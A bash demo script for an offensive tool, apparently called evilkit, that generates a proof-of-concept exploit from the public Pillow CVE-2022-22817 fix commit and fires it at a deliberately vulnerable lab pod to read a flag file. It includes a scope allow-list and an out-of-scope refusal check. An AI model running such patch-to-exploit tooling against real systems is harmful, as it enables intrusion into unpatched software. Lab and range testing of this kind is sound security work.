#!/usr/bin/env bash
# evilkit patch-diff-poc — Keystone showcase
#
# Takes the public CVE-2022-22817 fix commit on python-pillow/Pillow, runs
# `evilkit patch-diff-poc` on it to synthesise a scope-gated PoC script, and
# fires it at the keystone-range `legacy-cve` pod (which pins Pillow 8.3.2 on
# purpose). On a healthy range the PoC returns the pod's rotated flag.
#
# Hosts touched:
#   10.99.50.114:8082   legacy-cve pod (keystone DMZ, authorised target)
#
# Required: a running keystone range (bin/launch.sh completed) and network
# reachability from this box to 10.99.50.114:8082. The script writes nothing
# into the range — the PoC it generates is a client that performs a single
# GET to /eval; cleanup is implicit (nothing persists on the target).

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
EVILKIT_SRC="${EVILKIT_SRC:-$HOME/evilkit}"
WORK="${WORK:-$ROOT/runs/patchdiff-demo-$(date +%Y%m%d-%H%M%S)}"
TARGET="${TARGET:-http://10.99.50.114:8082}"
COMMIT_URL="${COMMIT_URL:-https://github.com/python-pillow/Pillow/commit/f7a2201080656f73c86f1dc82c7e9769d1082b7a}"
FLAG_PATH="${FLAG_PATH:-/opt/app/flag.txt}"

mkdir -p "$WORK"

if [ ! -d "$EVILKIT_SRC" ]; then
  echo "evilkit source not at $EVILKIT_SRC (override with EVILKIT_SRC=...)" >&2
  exit 2
fi

# 1. Write the scope allow-list the generated PoC will enforce.
SCOPE="$WORK/scope.txt"
cat > "$SCOPE" <<EOF
# scope allow-list for the generated PoC. Only hosts/CIDRs listed here will be
# touched; anything else exits 3 with "REFUSED" before any request is sent.
10.99.50.114
EOF

# 2. Reachability probe — fail fast if the range isn't up / routable.
echo "[0] reachability: $TARGET"
if ! curl -sS -m 5 -o /dev/null -w "%{http_code}\n" "$TARGET/" >/tmp/evilkit-pdp-head 2>/dev/null; then
  echo "    could not reach $TARGET — is the range up and the pod running?" >&2
  echo "    (run bin/launch.sh in $ROOT first)" >&2
  exit 1
fi
echo "    HTTP $(cat /tmp/evilkit-pdp-head)"

# 3. Generate recipe + script from the public CVE fix commit.
echo "[1] evilkit patch-diff-poc <$COMMIT_URL>"
cd "$EVILKIT_SRC"
python3 -m evilkit patch-diff-poc "$COMMIT_URL" \
  --out-dir "$WORK" \
  --flag-path "$FLAG_PATH"

SCRIPT=$(ls -1 "$WORK"/poc_python-pillow_Pillow_*.py | head -1)
RECIPE=$(ls -1 "$WORK"/poc_python-pillow_Pillow_*.recipe.json | head -1)
echo
echo "[2] recipe facts:"
python3 -c "import json,sys; r=json.load(open('$RECIPE')); print('    sink_class :', r['sink_class']); print('    cve_id     :', r['cve_id']); print('    files      :', r['affected_files'])"

# 4. Fire the generated PoC at the authorised target.
echo
echo "[3] firing PoC at $TARGET  (scope-gated by $SCOPE)"
EVIDENCE="$WORK/evidence.json"
python3 "$SCRIPT" \
  --target "$TARGET" \
  --scope-file "$SCOPE" \
  --endpoint /eval \
  --param expr \
  --evidence "$EVIDENCE" \
  || true   # non-zero if the pod rejected it; we still want the evidence file

echo
echo "[4] evidence summary ($EVIDENCE):"
python3 -c "
import json
r = json.load(open('$EVIDENCE'))
print('    status   :', r['status'])
print('    hit      :', r['hit'])
head = (r.get('body_head') or '').strip()
print('    body_head:', head[:200])
if r['hit'] and 'KEYSTONE{' in head:
    print()
    print('    FLAG RECOVERED:', [p for p in head.split() if p.startswith('KEYSTONE{')][:1])
"

echo
echo "[5] out-of-scope negative check (same script, non-authorised target)"
set +e
python3 "$SCRIPT" \
  --target http://10.0.0.1:8082 \
  --scope-file "$SCOPE" \
  --endpoint /eval --param expr --payload none 2>&1 | sed 's/^/    /'
rc=$?
set -e
echo "    (exit $rc; expected 3 = scope refusal)"

echo
echo "done. artefacts in $WORK"
